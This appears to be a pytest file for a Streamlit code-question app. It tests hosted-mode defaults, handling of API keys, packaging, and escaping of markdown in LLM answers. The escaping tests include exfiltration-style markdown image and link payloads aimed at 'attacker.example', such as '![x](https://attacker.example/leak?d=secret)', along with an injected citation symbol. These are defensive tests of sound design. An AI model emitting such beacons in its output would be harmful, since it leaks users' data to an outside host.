"""Hosted deployment (Streamlit Community Cloud): hosted mode, markdown safety, packaging."""

from __future__ import annotations

import json
import os
import re
import shutil
import tomllib
from pathlib import Path

import pytest

from coderag import app_logic as L
from coderag.llm import ScriptedLLM
from conftest import FIXTURE_ROOT, PROJECT_ROOT

AppTest = pytest.importorskip(
    "streamlit.testing.v1", reason="streamlit not installed (pip install -e '.[app]')").AppTest

APP = str(PROJECT_ROOT / "src" / "coderag" / "streamlit_app.py")
ENV_KEY = "sk-test-HOSTEDENV0123456789abcd"
GOOD_CITE = {"path": "shopcore/utils.py", "start_line": 9, "end_line": 13, "symbol": "slugify"}


@pytest.fixture(autouse=True)
def isolated_env(tmp_path):
    saved = os.environ.copy()
    for var in ["CODERAG_HOSTED", "CODERAG_ALLOWED_ROOTS", "CODERAG_ALLOW_INSECURE_LOCAL",
                "CODERAG_MODEL", "OPENAI_API_KEY", "GEMINI_API_KEY", "CODERAG_LLM_KEY",
                "ANTHROPIC_API_KEY", "CODERAG_MAX_REPO_FILES"]:
        os.environ.pop(var, None)
    os.environ["CODERAG_DB_DIR"] = str(tmp_path / "dbs")
    yield
    os.environ.clear()
    os.environ.update(saved)
    L.reset_client_factory()


def final(answer, *cites):
    return ScriptedLLM.final(json.dumps({"answer": answer, "citations": list(cites)}))


# ------------------------------------------------------------------ markdown safety


@pytest.mark.parametrize("text", [
    "![x](https://attacker.example/leak?d=secret)",
    "[click](https://attacker.example)",
    "![a][1]\n\n[1]: https://attacker.example/i.png",
    "<img src=https://attacker.example/x.png>",
    "<https://attacker.example>",
])
def test_md_escape_neutralizes_links_images_and_html(text):
    out = L.md_escape(text)
    unescaped = re.compile(r"(?<!\\)[\[\]()!<>]")
    assert not unescaped.search(out), out
    assert "](" not in out and "![" not in out


def test_md_escape_keeps_plain_text_readable():
    assert L.md_escape("slugify_text makes `slugs` from text.") == (
        "slugify_text makes `slugs` from text.")
    assert L.md_escape("") == ""


def test_malicious_answer_renders_without_live_images(tmp_path):
    repo = tmp_path / "repo"
    shutil.copytree(FIXTURE_ROOT, repo, ignore=shutil.ignore_patterns("__pycache__"))
    evil = "Done ![x](https://attacker.example/leak?d=secret) [y](https://attacker.example)"
    evil_cite = {**GOOD_CITE, "path": "shopcore/utils.py", "symbol": "slugify![i](https://a.example/p)"}
    L.set_client_factory(lambda *a: ScriptedLLM([final(evil, evil_cite), final(evil, evil_cite)]))
    at = AppTest.from_file(APP, default_timeout=120).run()
    at.toggle(key="demo").set_value(False).run()
    at.selectbox(key="provider").set_value("openai").run()
    at.text_input(key="model").set_value("m-1").run()
    at.text_input(key="api_key").set_value("typed-key-123456").run()
    at.text_input(key="repo_path").set_value(str(repo)).run()
    at.button(key="index_btn").click().run()
    at.text_area(key="question").set_value("What does slugify do?").run()
    at.button(key="ask_btn").click().run()
    assert not at.exception
    values = [m.value for m in at.markdown] + [e.label for e in at.expander]
    assert any("attacker.example" in v for v in values)  # still shown, as inert text
    for v in values:
        assert "](" not in v and "![" not in v, v


# ------------------------------------------------------------------ hosted mode logic


def test_hosted_mode_flag(monkeypatch):
    assert L.hosted_mode() is False
    os.environ["CODERAG_HOSTED"] = "1"
    assert L.hosted_mode() is True


def test_apply_hosted_defaults():
    os.environ["CODERAG_HOSTED"] = "1"
    os.environ["CODERAG_ALLOW_INSECURE_LOCAL"] = "1"
    del os.environ["CODERAG_DB_DIR"]
    L.apply_hosted_defaults()
    assert Path(os.environ["CODERAG_ALLOWED_ROOTS"]).resolve() == FIXTURE_ROOT.resolve()
    assert "CODERAG_ALLOW_INSECURE_LOCAL" not in os.environ
    assert os.environ["CODERAG_DB_DIR"]
    assert L.validate_repo(str(FIXTURE_ROOT)).ok
    assert not L.validate_repo(str(PROJECT_ROOT / "src")).ok
    assert not L.validate_repo("/").ok


def test_apply_hosted_defaults_respects_explicit_allowlist(tmp_path):
    os.environ["CODERAG_ALLOWED_ROOTS"] = str(tmp_path)
    L.apply_hosted_defaults()
    assert os.environ["CODERAG_ALLOWED_ROOTS"] == str(tmp_path)


def test_app_key_never_reads_env_when_hosted():
    os.environ["OPENAI_API_KEY"] = ENV_KEY
    assert L.app_key("openai", "", hosted=False) == ENV_KEY
    assert L.app_key("openai", "", hosted=True) is None
    assert L.app_key("openai", "typed", hosted=True) == "typed"


def test_visible_providers():
    assert "ollama" in L.visible_providers(hosted=False)
    hosted = L.visible_providers(hosted=True)
    assert "ollama" not in hosted and "gemini" in hosted and "openai_compatible" in hosted


# ------------------------------------------------------------------ hosted mode UI


def start_hosted() -> AppTest:
    os.environ["CODERAG_HOSTED"] = "1"
    os.environ["OPENAI_API_KEY"] = ENV_KEY
    at = AppTest.from_file(APP, default_timeout=120).run()
    assert not at.exception, [e.value for e in at.exception]
    return at


def rendered(at) -> str:
    parts = []
    for kind in ["markdown", "caption", "code", "error", "warning", "info", "success"]:
        parts += [str(el.value) for el in getattr(at, kind)]
    return "\n".join(parts + [e.label for e in at.expander])


def test_hosted_ui_defaults_and_notice():
    at = start_hosted()
    assert at.toggle(key="demo").value is True
    assert "ollama" not in at.selectbox(key="provider").options
    assert Path(at.text_input(key="repo_path").value).resolve() == FIXTURE_ROOT.resolve()
    text = rendered(at)
    assert "hosted demo" in text.lower()
    assert "Key found in environment" not in text


def test_hosted_ui_does_not_use_server_key():
    calls = []
    L.set_client_factory(lambda p, m, k, b: calls.append(k) or ScriptedLLM([final("x", GOOD_CITE)]))
    at = start_hosted()
    at.selectbox(key="provider").set_value("openai").run()
    at.toggle(key="demo").set_value(False).run()
    at.text_input(key="model").set_value("m-1").run()
    at.button(key="index_btn").click().run()
    at.text_area(key="question").set_value("What does slugify do?").run()
    at.button(key="ask_btn").click().run()
    assert ENV_KEY not in calls
    assert calls == [] or calls == [None]
    assert ENV_KEY not in rendered(at)


def test_hosted_ui_rejects_paths_outside_bundled_repo():
    at = start_hosted()
    at.text_input(key="repo_path").set_value(str(PROJECT_ROOT / "src")).run()
    at.button(key="index_btn").click().run()
    assert any("CODERAG_ALLOWED_ROOTS" in e.value for e in at.error)


# ------------------------------------------------------------------ packaging and repo hygiene


def test_requirements_txt_installs_package_with_app_extra():
    lines = [ln.strip() for ln in (PROJECT_ROOT / "requirements.txt").read_text().splitlines()
             if ln.strip() and not ln.strip().startswith("#")]
    assert lines == [".[app]"]


def test_heavy_embedding_dependency_is_optional():
    data = tomllib.loads((PROJECT_ROOT / "pyproject.toml").read_text())
    deps = " ".join(data["project"]["dependencies"])
    extras = data["project"]["optional-dependencies"]
    assert "fastembed" not in deps
    assert any("fastembed" in d for d in extras["embed"])
    assert any("streamlit" in d for d in extras["app"])


def test_gitignore_covers_secrets_and_local_state():
    ignored = (PROJECT_ROOT / ".gitignore").read_text().splitlines()
    for entry in [".env", ".streamlit/secrets.toml", "data/", ".venv/", ".coderag/",
                  "skills.md", "CLAUDE.md"]:
        assert entry in ignored, entry


def test_claims_runner_keeps_junit_out_of_reports():
    src = (PROJECT_ROOT / "scripts" / "claims.py").read_text()
    assert "tempfile" in src  # junit XML (includes the hostname) goes to a temp dir
    assert not (PROJECT_ROOT / "reports" / "claims_junit.xml").exists()


def test_project_root_falls_back_to_working_directory(tmp_path, monkeypatch):
    fake_pkg = tmp_path / "site-packages" / "coderag" / "app_logic.py"
    fake_pkg.parent.mkdir(parents=True)
    fake_pkg.write_text("")
    monkeypatch.setattr(L, "__file__", str(fake_pkg))
    monkeypatch.chdir(PROJECT_ROOT)
    assert L._project_root() == PROJECT_ROOT
    monkeypatch.chdir(tmp_path)
    assert L._project_root() == fake_pkg.resolve().parents[2]
